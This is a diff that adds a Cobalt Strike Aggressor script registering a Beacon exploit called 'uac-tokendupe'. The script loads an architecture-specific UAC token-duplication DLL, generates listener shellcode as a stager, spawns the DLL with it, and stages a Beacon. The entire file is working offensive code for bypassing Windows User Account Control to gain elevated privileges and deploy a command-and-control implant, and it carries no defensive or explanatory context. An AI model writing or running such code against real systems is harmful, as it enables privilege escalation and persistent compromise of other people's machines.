@@ -1,0 +1,31 @@
+sub uac-tokendupe {
+	$bid = $1;
+	$listener = $2;
+	btask($bid, "Task Beacon to run " . listener_describe($listener) . " via UAC Token Duplication");
+
+	if(-is64 $bid)
+	{
+		$arch = "x64";
+		$dll = getFileProper(script_resource("dll"), "UAC-TokenDuplication-x64.dll");
+	}
+	else
+	{
+		$arch = "x86";
+		$dll = getFileProper(script_resource("dll"), "UAC-TokenDuplication-x86.dll");
+	}	
+
+	$stager = shellcode($listener, false, $arch);
+
+
+	if ($stager is $null) 
+	{
+		berror($bid "No $arch stager for listener ' $+ $listener $+ '");
+		return;
+	}
+	
+	bdllspawn!($bid, $dll, $stager, "UAC Token Dupe", 5000);
+
+	bstage($bid, $null, $listener, $arch);
+
+}
+beacon_exploit_register("uac-tokendupe", "UAC Token Duplication", &uac-tokendupe);
